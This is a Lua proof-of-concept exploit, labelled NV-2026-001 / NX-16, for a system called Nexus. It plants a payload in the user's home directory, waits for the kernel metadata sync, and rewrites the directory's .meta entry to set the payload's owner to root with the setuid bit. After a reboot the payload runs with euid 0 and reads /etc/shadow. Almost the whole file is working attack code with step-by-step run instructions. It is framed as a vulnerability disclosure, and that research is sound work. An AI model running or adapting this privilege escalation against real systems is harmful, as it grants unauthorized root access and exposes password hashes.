-- NV-2026-001 / NX-16 proof of concept (plant stage).
--
-- process.exec() takes the owner and the set-user-ID bit of an executable from
-- vfs.attributes(), and those attributes come from the directory's .meta file.
-- A user who owns a directory can create and rewrite that .meta file. After the
-- directory is loaded again (the next boot), the forged entry makes the payload
-- run with euid 0.
--
-- Deploy to /usr/bin/ (main.lua makes it 0755) and run as an unprivileged
-- user inside Nexus:
--     nx16_meta_setuid
-- then power-cycle the computer, log in as the same user, and run the payload
-- path printed by the script.
--
-- Local research only. Do not run against systems you do not own.

if not _NEXUS then
    io.stderr:write("nx16: run this inside Nexus\n")
    os.exit(1)
end

local process = require("process")
local computer = require("computer")
local event = require("event")
local filesystem = require("filesystem")

local PAYLOAD_NAME = "nx16_payload.lua"
local FORGED_MODE = 4755 -- decimal digits, as stored in .meta
local WAIT_SECONDS = 15

local function fail(message)
    io.stderr:write("nx16: " .. message .. "\n")
    os.exit(1)
end

local me = process.getCurrent()
if not me then fail("cannot identify the current process") end
if me.euid == 0 then fail("run this as an unprivileged user") end

local home = os.getenv("HOME")
if not home or home == "" or home == "/" then
    fail("HOME is not a user directory")
end

local payload_path = home .. "/" .. PAYLOAD_NAME
local meta_path = home .. "/.meta"

local payload = [==[
local process = require("process")
local pid = process.getCurrentPID()
local me = process.get(pid)
io.write("nx16-payload: pid=" .. tostring(pid) ..
    " uid=" .. tostring(me and me.uid) ..
    " euid=" .. tostring(me and me.euid) .. "\n")

local file, err = io.open("/etc/shadow", "r")
if not file then
    io.write("nx16-payload: /etc/shadow denied: " .. tostring(err) .. "\n")
    os.exit(1)
end
local content = file:readAll()
file:close()
io.write("nx16-payload: /etc/shadow[1]=" ..
    (content:match("^[^\r\n]*") or "") .. "\n")
]==]

local function write_file(path, data)
    local file, err = io.open(path, "w")
    if not file then return nil, err end
    local ok, write_err = file:write(data)
    file:close()
    if not ok then return nil, write_err end
    return true
end

local function read_file(path)
    local file = io.open(path, "r")
    if not file then return nil end
    local content = file:readAll()
    file:close()
    return content
end

if filesystem.exists(payload_path) then
    -- A previous run may have left a root-owned, setuid payload behind.
    pcall(filesystem.remove, payload_path)
end

local ok, err = write_file(payload_path, payload)
if not ok then fail("cannot write payload: " .. tostring(err)) end

-- Make sure .meta has a vnode and is empty before the kernel rewrites it.
local meta, meta_err = io.open(meta_path, "w")
if not meta then fail("cannot create .meta: " .. tostring(meta_err)) end
meta:close()

-- Force the home directory to be dirty after .meta was truncated. Creating and
-- removing a temporary entry is enough; the sync thread rewrites .meta from the
-- in-memory children on its next pass.
do
    local tmp_path = home .. "/.nx16_touch"
    local tmp = io.open(tmp_path, "w")
    if tmp then
        tmp:close()
        pcall(filesystem.remove, tmp_path)
    end
end

io.write("nx16: waiting for the kernel metadata sync\n")
local deadline = computer.uptime() + WAIT_SECONDS
local content
while computer.uptime() < deadline do
    -- _dirty stays true until every queued directory has been written. Waiting
    -- for it to clear avoids forging while another sync pass is still pending.
    if filesystem._dirty == false then
        content = read_file(meta_path)
        if content and content:find(PAYLOAD_NAME, 1, true) then break end
    end
    content = nil
    event.pull(0.25)
end
if not content then
    fail(".meta did not receive the payload entry; do not modify the directory and retry")
end

-- Rewrite only the payload's line. The other entries keep their attributes.
local lines = {}
local found = false
for line in content:gmatch("[^\r\n]+") do
    local name, vtype, hash, mtime, btime, mode, refcount, uid, gid, link =
        line:match("^([^:]+):([^:]+):(%d+):(%d+):(%d+):(%d+):(%d+):(%d+):(%d+):?(.*)$")
    if name == PAYLOAD_NAME then
        found = true
        lines[#lines + 1] = string.format("%s:%s:%s:%s:%s:%d:%d:%d:%d:%s",
            name, vtype, hash, mtime, btime, FORGED_MODE, 1, 0, 0, link)
    else
        lines[#lines + 1] = line
    end
end
if not found then fail("payload entry is missing from .meta") end

ok, err = write_file(meta_path, table.concat(lines, "\n") .. "\n")
if not ok then fail("cannot write forged .meta: " .. tostring(err)) end

io.write("nx16: planted a forged entry for " .. payload_path .. "\n")
io.write("nx16: power-cycle the computer, log in as the same user, then run:\n")
io.write("  " .. payload_path .. "\n")
io.write("nx16: expected output: uid=" .. tostring(me.uid) ..
    " euid=0 and the first line of /etc/shadow\n")
io.write("nx16: do not create or remove files in " .. home .. " before rebooting\n")
